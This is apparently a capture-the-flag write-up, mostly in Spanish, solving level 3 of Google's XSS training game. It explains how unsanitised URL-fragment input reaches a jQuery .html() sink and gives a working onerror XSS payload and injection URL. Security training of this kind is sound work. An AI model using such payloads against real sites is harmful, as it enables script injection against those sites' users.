#[3/6]  Level 3: That sinking feeling...

##Mission Description

As you've seen in the previous level, some common JS functions are execution sinks which means that they will cause the browser to execute any scripts that appear in their input. Sometimes this fact is hidden by higher-level APIs which use one of these functions under the hood. 

The application on this level is using one such hidden sink.

#Mission Objective

As before, inject a script to pop up a JavaScript alert() in the app. 

Since you can't enter your payload anywhere in the application, you will have to manually edit the address in the URL bar below.

#Write Up Iker

Al igual que en los dos anteriores niveles, tenemos que ejcutar una alerta en el navegador utilizando técnicas de XSS.

En este caso vamos a leer bien el código fuente que nos proporcionan para ver si existe alguna vulnerabilidad o campo donde podamos injectar código para que ejecute nuestra alerta

Nos fijamos en el siguiente trozo de código que nos da unapista de como se muestran las imagenes en las pestañas:

```javascript
function chooseTab(num) {
        // Dynamically load the appropriate image.
        var html = "Image " + parseInt(num) + "<br>";
        html += "<img src='/static/level3/cloud" + num + ".jpg' />";
        $('#tabContent').html(html);
```  

Después de ver el código podemos ver como realiza una concatenación entre la ruta donde se alojan las imagenes `/static/level3/cloud" + num + ".jpg` que podrían ser `Imagecloud1.jpg` `Imagecloud2.jpg` `Imagecloud3.jpg` por ejemplo

Podemos observar que ese campo es perfectamente injectable si lo modificamos de la siguiente manera:

```html
<img src='/static/level3/cloud'><img src=x onerror=alert('Rediooooo')>.jpg'/>
```

Sustituyendo el valor `num` por  `'><img src=x onerror=alert('Rediooooo')>`

De esta manera el código a injectar en la url queda de la siguiente manera:

```html
https://xss-game.appspot.com/level3/frame#3<img src='/static/level3/cloud'><img src=x onerror=alert('Rediooooo')>.jpg'/>
```

Haciendo esto conseguimos que salte una alerta en el navegador y pasamos al siguiente nivel :)

Iker Burguera
